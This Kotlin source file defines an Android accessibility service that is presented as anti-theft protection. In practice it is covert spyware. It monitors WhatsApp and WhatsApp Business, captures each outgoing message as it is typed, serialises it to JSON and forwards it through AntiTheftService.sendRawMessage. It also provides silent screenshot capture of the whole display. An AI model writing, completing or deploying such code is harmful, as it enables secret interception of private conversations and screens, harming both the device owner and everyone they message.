package com.androidprotect

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.serialization.json.Json
import kotlinx.serialization.builtins.serializer
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi

class ProtectAccessibilityService : AccessibilityService() {

    private val whatsAppDrafts = mutableMapOf<String, String>()

    override fun onServiceConnected() {
        instance = this
        Log.d("AccessibilityService", "Connected — screen capture now permanent")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in WHATSAPP_PACKAGES) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val source = event.source ?: return
                if (source.className?.contains("EditText") == true) {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank()) {
                        whatsAppDrafts[pkg] = text
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val source = event.source ?: return
                val desc = source.contentDescription?.toString() ?: ""
                val isSend = desc.contains("enviar", ignoreCase = true) ||
                        desc.contains("send", ignoreCase = true) ||
                        desc.contains("send message", ignoreCase = true)
                if (isSend) {
                    val text = whatsAppDrafts[pkg]
                    if (!text.isNullOrBlank()) {
                        sendOutgoingWhatsApp(text)
                        whatsAppDrafts[pkg] = ""
                    }
                }
            }
        }
    }

    private fun sendOutgoingWhatsApp(text: String) {
        try {
            val content = Json.encodeToString(String.serializer(), text)
            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"out","address":"","content":$content,"timestamp":${System.currentTimeMillis()}}"""
            AntiTheftService.sendRawMessage(payload)
            Log.d("AccessibilityService", "forwarded outgoing WhatsApp message")
        } catch (e: Exception) {
            Log.e("AccessibilityService", "Failed to forward outgoing WhatsApp: ${e.message}")
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        if (instance === this) instance = null
        super.onDestroy()
    }

    @RequiresApi(Build.VERSION_CODES.R)
    fun captureScreen(callback: (Bitmap?) -> Unit) {
        try {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        val bitmap = Bitmap.wrapHardwareBuffer(
                            result.hardwareBuffer,
                            result.colorSpace
                        )
                        result.hardwareBuffer.close()
                        callback(bitmap)
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.w("AccessibilityService", "Screenshot failed: $errorCode")
                        callback(null)
                    }
                }
            )
        } catch (e: Exception) {
            Log.e("AccessibilityService", "captureScreen error: ${e.message}")
            callback(null)
        }
    }

    companion object {
        @Volatile var instance: ProtectAccessibilityService? = null
        private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")

        fun isEnabled(context: Context): Boolean {
            val flat = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return flat.contains("${context.packageName}/${ProtectAccessibilityService::class.java.name}")
        }
    }
}
